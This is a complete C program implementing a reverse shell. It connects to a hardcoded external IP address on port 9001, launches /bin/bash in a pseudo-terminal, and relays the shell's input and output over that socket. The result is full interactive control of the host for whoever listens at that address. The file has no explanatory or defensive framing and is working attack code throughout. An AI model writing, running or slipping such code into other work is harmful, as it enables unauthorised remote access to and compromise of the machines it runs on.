#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pty.h>
#include <sys/wait.h>

#define BUFFER_SIZE 1024

int main(int argc, char *argv[]) {
    int sock;
    struct sockaddr_in server_addr;
    char *server_ip;
    int server_port;
    int master_fd;
    pid_t pid;
    char buffer[BUFFER_SIZE];
    fd_set read_fds;
    int max_fd;

    server_ip = "13.233.34.85";
    server_port = 9001;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Setup server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    
    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Create a pseudo-terminal
    pid = forkpty(&master_fd, NULL, NULL, NULL);
    
    if (pid < 0) {
        perror("forkpty failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        // Child process - execute shell
        char *args[] = {"/bin/bash", NULL};
        execve("/bin/bash", args, NULL);
        
        // If execve fails
        perror("execve failed");
        exit(EXIT_FAILURE);
    }

    // Parent process - relay data between socket and PTY
    max_fd = (sock > master_fd ? sock : master_fd) + 1;

    while (1) {
        FD_ZERO(&read_fds);
        FD_SET(sock, &read_fds);
        FD_SET(master_fd, &read_fds);

        if (select(max_fd, &read_fds, NULL, NULL, NULL) < 0) {
            perror("select failed");
            break;
        }

        // Data from server -> PTY (shell input)
        if (FD_ISSET(sock, &read_fds)) {
            ssize_t n = read(sock, buffer, BUFFER_SIZE);
            if (n <= 0) {
                break;  // Server disconnected
            }
            write(master_fd, buffer, n);
        }

        // Data from PTY -> server (shell output)
        if (FD_ISSET(master_fd, &read_fds)) {
            ssize_t n = read(master_fd, buffer, BUFFER_SIZE);
            if (n <= 0) {
                break;  // Shell exited
            }
            write(sock, buffer, n);
        }
    }

    // Cleanup
    close(master_fd);
    close(sock);
    kill(pid, SIGTERM);
    waitpid(pid, NULL, 0);

    return 0;
}
